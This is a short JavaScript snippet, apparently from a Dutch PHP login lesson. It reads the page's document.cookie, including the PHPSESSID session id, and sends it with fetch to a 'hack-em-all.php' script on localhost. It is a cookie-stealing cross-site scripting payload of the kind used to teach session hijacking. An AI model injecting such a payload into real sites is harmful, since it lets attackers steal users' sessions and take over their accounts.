// alert('Hallo! Cookie: ' + document.cookie);

baseUrl = 'http://localhost:8080/test-php/les-7-login/_includes/hack-em-all.php'

// Bron: https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/
sessionId = 'alkje020'
sessionId = document.cookie
fetch(baseUrl + `?sessionId=${sessionId}`)

PHPSESSID